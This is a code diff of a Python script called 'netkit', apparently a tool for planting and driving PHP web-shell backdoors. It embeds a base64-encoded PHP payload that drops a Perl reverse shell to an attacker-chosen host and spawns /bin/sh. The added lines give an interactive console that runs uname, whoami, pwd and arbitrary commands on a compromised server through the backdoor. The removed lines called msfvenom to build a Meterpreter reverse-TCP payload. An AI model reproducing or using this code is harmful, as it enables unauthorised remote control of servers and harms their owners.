@@ -1,5 +1,5 @@
 #!/usr/bin/python
-import time,base64,urllib2,os,urllib,sys
+import time,base64,urllib2,os,urllib,sys,readline
 from Crypto.Hash import MD5
 h = MD5.new()
 reverse = "aWYoaXNzZXQoJF9QT1NUWyJyaG9zdCJdKSkgew0KJHJob3N0ID0gJF9QT1NUWyJyaG9zdCJdOw0KJHJwb3J0ID0gJF9QT1NUWyJycG9ydCJdOw0KJGYgPSBmb3BlbigicmV2ZXJzZS5wbCIsICJ3Iik7DQpmd3JpdGUoJGYsICd1c2UgU29ja2V0OyRpPSInLiRyaG9zdC4nIjskcD0nLiRycG9ydC4nO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9OycpOw0KZXhlYygicGVybCByZXZlcnNlLnBsIik7DQp9"
@@ -62,18 +62,37 @@ if len(sys.argv) == 4:
 		    data = urllib.urlencode({'cmd' : cmd, 'pass'  : sta3})
 		    req = urllib2.Request(sta2, data)
 		    response = urllib2.urlopen(req)
+		    uname = response.read()
+	            uname = uname.replace("\n","")
 		    cmd2 = "whoami"
 		    urllib2.urlopen(sta2)
 		    data2 = urllib.urlencode({'cmd' : cmd2, 'pass'  : sta3})
 		    req2 = urllib2.Request(sta2, data2)
 		    response2 = urllib2.urlopen(req2)
+		    who = response2.read()
+		    who = who.replace("\n","")
+		    cmd2 = "pwd"
+		    urllib2.urlopen(sta2)
+		    data2 = urllib.urlencode({'cmd' : cmd2, 'pass'  : sta3})
+		    req2 = urllib2.Request(sta2, data2)
+		    response2 = urllib2.urlopen(req2)
+		    pat = response2.read()
+		    pat = pat.replace("\n","")
 		    print "###################\n"
 		    print bcolors.BOLD + "[+] Target : " + bcolors.ENDC+sta2
-		    print bcolors.BOLD + "[+] Server : " + bcolors.ENDC+response.read()
-		    print bcolors.BOLD + "[+] Whoami : " + bcolors.ENDC+response2.read()
+		    print bcolors.BOLD + "[+] Server : " + bcolors.ENDC+uname
+		    print bcolors.BOLD + "[+] Whoami : " + bcolors.ENDC+who
 		    print "###################"
 		    while True:
-			rcmd = raw_input(bcolors.BOLD+bcolors.FAIL+"netkit Console > " +bcolors.ENDC)
+			cmd2 = "pwd"
+		    	urllib2.urlopen(sta2)
+			data2 = urllib.urlencode({'pt' : "1", 'pass'  : sta3})
+			req2 = urllib2.Request(sta2, data2)
+			response2 = urllib2.urlopen(req2)
+			pat = response2.read()
+			pat = pat.replace("\n","")
+			rcmd = raw_input(bcolors.BOLD+bcolors.FAIL+who+"@ "+pat+"> " +bcolors.ENDC)
+			cd = rcmd[0] + rcmd[1]
 			if rcmd == "exit": #Exit Control Panel
 			    break
 			elif rcmd == "clear": # Clear Terminal
@@ -93,29 +112,12 @@ if len(sys.argv) == 4:
 			    netkit connect http://localhost/backdoor.php abc123
 			    generate : For a generate backdoor
 			    connect : For a connect backdoor"""	 + bcolors.ENDC
-			elif rcmd == "msfgenerate":
-			    if msfip == "" and msfport == "":
-				print bcolors.BOLD + bcolors.FAIL +"""You have not defined local ip or port""", bcolors.ENDC,"""
-    set msfip <LHOST>
-    set msfport <LPORT>""" + bcolors.ENDC
-			    else:
-				os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST="+msfip+" LPORT="+msfport+" -f raw > msfshell.php")
-			elif rcmd == "set msfip":
-			    msfip = raw_input("LHOST : ")
-			elif rcmd == "set msfport":
-			    msfport = raw_input("LPORT : ")
-			elif rcmd == "msfoptions":
-			    print """
-			   Name   Current Setting
-			   ----   ---------------
-			   LHOST  """+msfip+"""
-			   LPORT  """+msfport+"""
-			"""
-			elif rcmd == "msfconnect":
-			    os.system("msfconsole")
+			elif cd == "cd":
+			    rcmd = rcmd.replace("cd ","")
+			    pathx = rcmd
 			elif rcmd != "": # CMD command
 			    urllib2.urlopen(sta2)
-			    data = urllib.urlencode({'cmd' : rcmd, 'pass'  : sta3})
+			    data = urllib.urlencode({'path': pathx,'cmd' : rcmd, 'pass'  : sta3})
 			    req = urllib2.Request(sta2, data)
 			    response = urllib2.urlopen(req)
 			    print response.read()
@@ -130,7 +132,6 @@ elif len(sys.argv) == 2:
 	print bcolors.BOLD + """
 python netkit.py --generate <filename> <password>
 python netkit.py --connect <url> <password>
-python netkit.py --connect http://localhost/netkit/backdoor.php abc123
 python netkit.py --help
 """ + bcolors.ENDC
 else:
